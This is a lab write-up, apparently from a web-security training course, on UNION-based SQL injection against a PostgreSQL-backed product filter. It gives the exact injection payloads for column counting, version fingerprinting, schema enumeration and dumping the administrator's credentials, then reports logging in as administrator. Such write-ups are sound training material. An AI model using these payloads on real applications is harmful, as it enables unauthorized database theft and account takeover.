Lab 5: SQL Injection UNION Attack, Extracting Data from Other Tables (PostgreSQL)
Objective: Enumerate the database schema to locate user credentials and extract the administrator’s password to compromise the application.
Vulnerability Analysis: The application's product category filter is vulnerable to a UNION-based SQL injection. Because the application uses PostgreSQL and reflects query results directly on the frontend, the vulnerability can be leveraged to query the information_schema—the database's internal data dictionary—to discover hidden tables and columns.
Exploitation Methodology:
1. Database Profiling & Column Enumeration To construct a valid UNION payload, the column count of the backend query was first determined using the ORDER BY clause:
' ORDER BY 1 -- (Success)
' ORDER BY 2 -- (Success)
' ORDER BY 3 -- (Error) This established a two-column requirement. A subsequent test (' UNION SELECT 'a', 'a' --) executed successfully without requiring a FROM DUAL clause, ruling out an Oracle database and confirming the columns accepted string data.
2. Version Fingerprinting To identify the specific relational database management system (RDBMS), I injected a version query payload.
Payload: ' UNION SELECT version(), NULL --
Result: The database returned PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4), confirming the environment.
3. Schema Enumeration (Tables) With the database identified as PostgreSQL, I targeted the information_schema.tables view to locate tables containing user data.
Payload: ' UNION SELECT table_name, NULL FROM information_schema.tables --
Result: Extracted the dynamically generated target table name: users_rpxght.
4. Schema Enumeration (Columns) Next, I queried the information_schema.columns view, specifically filtering for the discovered user table to extract the relevant column headers.
Payload: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_rpxght' --
Result: Extracted two critical columns: username_gsljdn and password_xkbbkd.
5. Data Exfiltration & Authentication Bypass Having mapped the necessary schema, I executed the final payload to dump the contents of the credential columns.
Payload: ' UNION SELECT username_gsljdn, password_xkbbkd FROM users_rpxght --
Result: Successfully extracted the administrator credentials (administrator : zgo4bedjdgieyhzbxoio).
Impact: By utilizing the extracted credentials at the application login portal, I successfully authenticated as the administrator, achieving total account takeover and full administrative privileges over the application.
